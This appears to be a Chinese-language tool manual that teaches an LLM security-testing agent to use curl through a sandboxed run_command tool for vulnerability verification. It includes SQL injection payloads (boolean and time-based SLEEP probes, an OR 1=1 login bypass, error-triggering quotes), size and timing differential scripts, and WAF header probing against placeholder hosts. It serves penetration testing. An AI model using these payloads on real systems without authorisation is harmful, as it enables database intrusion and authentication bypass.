---
name: tooling/curl
description: |
  curl 工具手册（通用 HTTP 客户端）。教 LLM 如何手动构造任意 HTTP 请求——payload 注入、
  响应长度/时间差分、自定义 header、cookie 透传、跟随 redirect、headers 探测等。
  适用于 SQLi / BAC / SSRF / IDOR / 业务逻辑等任意需要精确 HTTP 操控的漏洞验证。
  配合 run_command 工具使用。
---

# curl 用法手册

curl 是通用 HTTP 客户端——任何需要精确控制 HTTP 请求的场景都用它。
通过 `run_command(command="curl ...")` 在沙箱容器里跑。

> **容器 host 改写**：拼 URL 时如果 user prompt 里 host 是 `127.0.0.1` / `localhost` / 私网 IP（`10.*`/`172.16-31.*`/`192.168.*`），改写成 `host.docker.internal:<port>`；公网 IP/域名/内网域名原样保留。详见 `tooling/sqlmap` 手册"容器内 host 改写规则"。

## 核心模板（必会四种）

### 1. 静默 GET，看响应体

```
curl -s -b "<cookie>" "http://api.example.com/v1/products?id=1' AND 1=1--"
```

- `-s`：静默模式，禁掉进度条（不然 stdout 充斥 `[#####] 0.5%` 干扰 grep）
- `-b`：带 cookie 字符串

### 2. 只看 status / 长度 / 时间（用于差分）

```
curl -s -o /dev/null -b "<cookie>" \
     -w "status=%{http_code} size=%{size_download} time=%{time_total}\n" \
     "http://api.example.com/v1/products?id=1' AND 1=1--"
```

- `-o /dev/null`：丢弃 body
- `-w`：自定义输出字段
- 一行就能拿到状态码 / 长度 / 耗时，是布尔差分 / 时间侧信道的标准姿势

### 3. POST 表单

```
curl -s -X POST -b "<cookie>" \
     -d "user=admin' OR 1=1-- -&pass=x" \
     "http://api.example.com/v1/login"
```

### 4. POST JSON

```
curl -s -X POST -b "<cookie>" \
     -H "Content-Type: application/json" \
     --data-binary '{"id":"1 AND 1=1"}' \
     "http://api.example.com/v1/query"
```

注意 JSON 里的 `'` 用 `'\''` 转义避开 shell + JSON 双重引号坑。

## 关键参数速查

| 参数 | 用途 |
|---|---|
| `-s` | 静默（必带，否则 stdout 噪声大） |
| `-o <file>` | 输出 body 到文件；`/dev/null` 丢弃 |
| `-D -` | dump 响应头到 stdout（前缀 `< `） |
| `-w <fmt>` | 自定义 stdout 写出字段 |
| `-b <cookie>` | 请求 cookie |
| `-H <header>` | 自定义 header（可叠加多个，含 Authorization、X-API-Key 等 token 鉴权） |
| `-d <data>` | POST body（默认 form），自动设 Content-Type |
| `--data-binary <data>` | POST body 不做 url-encode（适合 JSON） |
| `-X <METHOD>` | 强制 HTTP method |
| `-L` | 跟随 302/301 redirect（默认不跟） |
| `-k` | 禁 SSL 校验（自签证书目标） |
| `--max-time N` | 整次硬超时（秒） |
| `--connect-timeout N` | TCP connect 超时（秒） |

## `-w` 字段（差分判定核心）

| 字段 | 含义 |
|---|---|
| `%{http_code}` | 状态码 |
| `%{size_download}` | 响应体字节数 |
| `%{size_header}` | 响应头字节数 |
| `%{time_total}` | 总耗时（秒，浮点） |
| `%{time_starttransfer}` | TTFB（首字节时间） |
| `%{redirect_url}` | 重定向目标 |
| `%{num_redirects}` | 重定向次数 |
| `%{content_type}` | 响应 Content-Type |

**布尔差分通用脚本**（一次跑两条 payload 比较）：

```bash
sh -c '
  T=$(curl -s -o /dev/null -b "<cookie>" -w "%{size_download}" "http://api.example.com/v1/products?id=1 AND 1=1-- -")
  F=$(curl -s -o /dev/null -b "<cookie>" -w "%{size_download}" "http://api.example.com/v1/products?id=1 AND 1=2-- -")
  echo "true_size=$T false_size=$F"
'
```

LLM 看到 `true_size=8421 false_size=219` 这种数量级差异 → 布尔注入坐实。

**时间侧信道脚本**：

```bash
sh -c '
  T1=$(curl -s -o /dev/null -b "<cookie>" -w "%{time_total}" "http://api.example.com/v1/products?id=1 AND IF(1=1, SLEEP(3), 0)-- -")
  T2=$(curl -s -o /dev/null -b "<cookie>" -w "%{time_total}" "http://api.example.com/v1/products?id=1 AND IF(1=2, SLEEP(3), 0)-- -")
  echo "true_time=$T1 false_time=$T2"
'
```

`true_time` ≈ 3.X 秒、`false_time` < 1 秒 → time-based 盲注坐实。

## 实战示例

> 示例里的 host/path/cookie 都是占位；按 user prompt 里抓到的真实值套用。

### 示例 1：手动验证错误注入

```
run_command({
  "command": "curl -s -b 'session=<token>' 'http://api.example.com/v1/products?id=1%27'",
  "tag": "curl-err-quote"
})
```

期望 stdout_tail 含 SQL 报错关键字（如 `You have an error in your SQL syntax` / `pg_query():` / `unclosed quotation mark`）。

### 示例 2：长度差分（一次调用拿两个数据点）

```
run_command({
  "command": "T=$(curl -s -o /dev/null -b 'session=<token>' -w '%{size_download}' 'http://api.example.com/v1/products?id=1 AND 1=1-- -'); F=$(curl -s -o /dev/null -b 'session=<token>' -w '%{size_download}' 'http://api.example.com/v1/products?id=1 AND 1=2-- -'); echo \"true=$T false=$F\"",
  "tag": "curl-bool-diff"
})
```

### 示例 3：grep 关键字而非看完整 body

如果 body 巨大（HTML 页面，1MB+），1.5KB tail 看不到关键字：

```
run_command({
  "command": "curl -s -b '...' 'http://api.example.com/v1/products?id=...' | grep -iE 'sql|error|warning|exception' | head -20",
  "tag": "curl-grep"
})
```

### 示例 4：dump 响应头看 WAF 标识

```
run_command({
  "command": "curl -s -o /dev/null -D - -b '...' 'http://api.example.com/v1/products?id=1%27' | grep -iE 'server|x-|cf-|via:'",
  "tag": "curl-headers"
})
```

## 常见坑

1. **不带 `-s`**：stdout 顶部会有进度条 ASCII，grep 关键字时被噪声干扰
2. **shell 引号嵌套**：payload 含 `'` 时整条 command 用 `"..."` 包，内部 `'` 写成 `'\''` 或换 JSON `'`
3. **`-d` 自动 url-encode 表单**：传 JSON 必须用 `--data-binary` 或加 `-H "Content-Type: application/json"`
4. **`-L` 默认不跟随**：登录页 302 → 200 一定加 `-L`，否则只看到 302 空 body
5. **`--max-time` 默认无限**：脚本里务必加 `--max-time 30`，避免单条 curl 把整个 run_command 拖到沙箱 timeout
6. **HTTP/2 默认开**：目标如果只支持 HTTP/1.1，加 `--http1.1`
7. **time-based 测量误差**：网络抖动 ±0.5 秒正常；用 `>= 3` 判而非 `> 1`
